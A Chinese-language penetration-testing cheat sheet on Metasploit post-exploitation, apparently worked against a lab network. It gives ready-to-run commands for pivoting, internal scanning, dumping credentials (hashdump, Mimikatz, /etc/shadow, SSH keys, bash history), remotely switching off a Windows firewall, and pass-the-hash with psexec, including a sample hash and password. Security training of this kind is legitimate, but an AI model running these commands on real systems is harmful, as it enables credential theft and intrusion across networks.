---
title: MSF内网渗透与横向移动
date: 2026-07-23 14:00:00 +0800
categories: [工具速查, MSF利用]
tags: [Metasploit, 内网渗透, 横向移动, 哈希传递, PTH, 代理]
description: MSF 内网渗透全流程，涵盖路由转发、内网扫描、SOCKS代理、凭证提取、哈希传递攻击等横向移动核心技术。
---

# MSF内网渗透与横向移动

## 一、内网路由与代理

### 1. 建立内网路由

```bash
meterpreter > run post/multi/manage/autoroute    # 自动添加内网路由
meterpreter > run autoroute -p                   # 查看路由表
```

> **知识点**：`autoroute` 模块通过 Meterpreter 会话在攻击机和目标内网之间建立路由。原理是利用已控主机作为跳板，将攻击机的流量转发到内网其他网段。自动模式下会读取目标主机的路由表和 ARP 缓存，添加所有发现的路由。

### 2. 手动添加路由

```bash
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > run autoroute -s 172.16.0.0/16
```

### 3. SOCKS 代理（全局内网访问）

```bash
# 在 Meterpreter 中建立路由后，退出到 MSF 控制台
meterpreter > background

# 启动 SOCKS 代理服务器
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j
```

> **知识点**：SOCKS 代理将攻击机的任意工具流量通过 Meterpreter 会话转发到内网。配置后使用 `proxychains` 包装命令即可扫描和访问内网资源。SOCKS5 支持认证和 UDP，比 SOCKS4 更安全。

### 4. Proxychains 使用

```bash
# /etc/proxychains4.conf
# 末尾添加：
# socks5 127.0.0.1 1080

# 使用
proxychains4 nmap -Pn -sT 192.168.93.130
proxychains4 ./fscan -h 192.168.93.130
proxychains4 crackmapexec smb 192.168.93.0/24
```

> **知识点**：使用 `proxychains` 时，nmap 必须加 `-sT`（TCP Connect 扫描）和 `-sU` 不可用，因为 SOCKS 代理不支持原始数据包操作。`-Pn` 跳过 ping 探测，因为 ICMP 不走代理。

## 二、内网扫描

### 1. Ping 存活探测

```bash
msf6 > use post/multi/gather/ping_sweep
msf6 post(multi/gather/ping_sweep) > set RHOSTS 172.17.0.0/16
msf6 post(multi/gather/ping_sweep) > set SESSION 1
msf6 post(multi/gather/ping_sweep) > run
```

### 2. TCP 端口扫描

```bash
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.45.0/24
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 21,22,80,135,139,445,3306,3389,6379,8080,8443
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 32
msf6 auxiliary(scanner/portscan/tcp) > run
```

> **知识点**：内网扫描建议将线程控制在 32-50 之间，过高会导致网络拥塞和丢包。常见内网高危端口：445（SMB/MS17-010）、3389（RDP）、3306（MySQL弱口令）、6379（Redis未授权）、8080（Tomcat管理后台）。

### 3. UDP 扫描

```bash
msf6 > use auxiliary/scanner/discovery/udp_probe
msf6 auxiliary(scanner/discovery/udp_probe) > set RHOSTS 192.168.93.0/24
msf6 auxiliary(scanner/discovery/udp_probe) > set THREADS 20
msf6 auxiliary(scanner/discovery/udp_probe) > run
```

> **知识点**：UDP 扫描比 TCP 慢得多，因为无响应不意味着端口关闭（可能被防火墙丢弃）。DNS（53）、SNMP（161）、NTP（123）是内网常见的 UDP 服务。

## 三、端口转发

### 反向端口转发

```bash
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.52.141
# 访问本机 8080 = 访问内网 192.168.52.141 的 80

meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.52.138
# 访问本机 3389 = 访问内网目标 RDP

meterpreter > portfwd list    # 查看转发列表
meterpreter > portfwd delete -l 8080   # 删除转发
```

> **知识点**：`portfwd` 只能在已有 Meterpreter 会话时工作。转发是单向的（本机→内网），适用于访问内网 Web 服务、数据库、RDP 等。对于大量端口的扫描，推荐使用 SOCKS 代理。

## 四、凭证提取

### 1. Windows 敏感信息

#### Hashdump

```bash
meterpreter > hashdump
# 输出格式：用户名:RID:LM哈希:NTLM哈希:::
```

> **知识点**：`hashdump` 读取注册表中的 SAM 数据库（`HKLM\SAM`），需要 SYSTEM 权限。LM 哈希通常为固定值（`aad3b435b51404eeaad3b435b51404ee`），说明系统禁用了 LM 存储。NTLM 哈希可用于 Pass-the-Hash 攻击。

#### 域环境哈希提取

```bash
meterpreter > getsystem                          # 确保 SYSTEM 权限
meterpreter > run windows/gather/smart_hashdump  # 自动提取所有哈希
```

> **知识点**：`smart_hashdump` 会尝试多种方式提取哈希：从注册表 SAM、从 LSASS 内存（模拟域控同步）、从 NTDS.dit 文件。在域环境中可获取域内所有用户的 NTLM 哈希。

#### Kiwi（Mimikatz）模块

```bash
meterpreter > load kiwi
meterpreter > creds_all                          # 所有缓存凭据
meterpreter > lsa_dump_sam                       # SAM 哈希
meterpreter > kiwi_cmd sekurlsa::logonpasswords  # 内存明文密码
```

> **知识点**：`kiwi` 是 MSF 内置的 Mimikatz 重写版。`sekurlsa::logonpasswords` 从 LSASS 进程内存中提取当前登录用户的明文密码（需 SYSTEM 权限）。高版本 Windows 10/2016+ 默认启用了 Credential Guard，阻止 LSASS 内存读取。

#### 自动登录密码

```bash
meterpreter > run windows/gather/credentials/windows_autologin
```

> **知识点**：部分服务器配置了 Windows 自动登录（AutoAdminLogon），凭据以明文存储在注册表 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` 中。

### 2. Linux 敏感信息

#### Shadow 哈希

```bash
meterpreter > shell
cat /etc/shadow
# 格式：用户名:$加密算法$盐值$哈希:...
```

> **知识点**：`/etc/shadow` 存储了用户密码的哈希，需要 root 权限读取。哈希格式 `$6$...` 表示 SHA-512，`$y$...` 表示 yescrypt（最新 Linux 默认）。可用 John the Ripper 或 hashcat 破解。

#### SSH 私钥

```bash
find / -name id_rsa 2>/dev/null
cat /root/.ssh/id_rsa
```

> **知识点**：SSH 私钥是实现 SSH 免密登录的核心凭证。如果找到其他用户的私钥，可以直接 SSH 横向到该用户权限可访问的其他主机。Kali 中 `ssh -i id_rsa user@target` 使用。

#### 历史命令

```bash
cat /root/.bash_history
cat /home/*/.bash_history
```

> **知识点**：bash 历史常包含明文密码（如 `mysql -u root -pPassword`）、数据库连接字符串、内网 IP 地址等敏感信息。是内网信息收集的重要数据源。

#### Sudo 配置

```bash
cat /etc/sudoers | grep -v "^#"
```

> **知识点**：`sudoers` 中 `NOPASSWD` 配置允许用户无需密码执行 sudo 命令。常见的提权路径：`(ALL) NOPASSWD: /usr/bin/vim` → `vim` 内执行 `:!bash` 直接获取 root shell。

## 五、哈希传递攻击（PTH）

### 1. Windows PTH

#### 前置条件：关闭目标防火墙

```bash
# 建立 IPC 连接
net use \\192.168.93.10\ipc$ "zxcASDqw123!!" /user:"Administrator"

# 远程关闭防火墙
sc \\192.168.93.10 create unablefirewall binpath= "netsh advfirewall set allprofiles state off"
sc \\192.168.93.10 start unablefirewall
```

> **知识点**：Windows 防火墙默认阻止 SMB 入站（445 端口）。通过 `sc` 远程创建服务并启动，执行防火墙关闭命令。`IPC$` 是空连接管道，用于远程 RPC 调用，需要目标管理员凭据。

#### MSF psexec 模块

```bash
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.52.138
msf6 exploit(windows/smb/psexec) > set SMBUser liukaifeng01
msf6 exploit(windows/smb/psexec) > set SMBPass 00000000000000000000000000000000:74598aa5d9bedd9c09ef78d0fd71ce27
msf6 exploit(windows/smb/psexec) > set SMBDomain god    # 域环境需要设置
msf6 exploit(windows/smb/psexec) > run
```

> **知识点**：PTH（Pass-the-Hash）使用 NTLM 哈希（格式 `LM:NTLM`，LM 部分可全零）替代明文密码进行 SMB 认证。`psexec` 通过 SMB 上传可执行文件到 admin$ 共享，创建 Windows 服务并执行，返回 SYSTEM 权限的 Meterpreter 会话。

### 2. Linux SSH 横向

```bash
# 破解 shadow 哈希
john --format=sha512crypt /root/shadow.txt

# 使用破解的密码 SSH 登录
ssh user@192.168.52.142

# 或使用提取的私钥
ssh -i /root/.ssh/id_rsa root@192.168.52.142
```

> **知识点**：Linux 无法直接进行哈希传递（没有类似 Windows 的 NTLM 协议），必须将哈希破解为明文密码后使用。但 SSH 私钥传递不受此限制——找到私钥即可直接登录。

## 六、速查对照表

| 步骤 | 命令/模块 | 说明 |
|------|-----------|------|
| 路由建立 | `run post/multi/manage/autoroute` | 自动识别并添加路由 |
| 路由查看 | `run autoroute -p` | 确认内网网段 |
| SOCKS 代理 | `auxiliary/server/socks_proxy` | 全局内网代理 |
| Ping 扫描 | `post/multi/gather/ping_sweep` | 存活主机探测 |
| TCP 扫描 | `auxiliary/scanner/portscan/tcp` | TCP 端口扫描 |
| UDP 扫描 | `auxiliary/scanner/discovery/udp_probe` | UDP 端口扫描 |
| 端口转发 | `portfwd add -l L -p P -r R` | 单端口映射 |
| Windows 哈希 | `hashdump` / `load kiwi` | NTLM 提取 |
| 域哈希 | `run windows/gather/smart_hashdump` | 域内全量哈希 |
| Linux 哈希 | `cat /etc/shadow` | Shadow 文件读取 |
| SSH 密钥 | `find / -name id_rsa` | 私钥查找 |
| Windows PTH | `exploit/windows/smb/psexec` | 哈希传递攻击 |
| Linux 破解 | `john --format=sha512crypt` | 哈希破解 |

---

> 至此，MSF利用系列三篇文章已全部完成：Payload生成 → 提权与权限维持 → 内网渗透与横向移动，覆盖了渗透测试的核心攻击链。
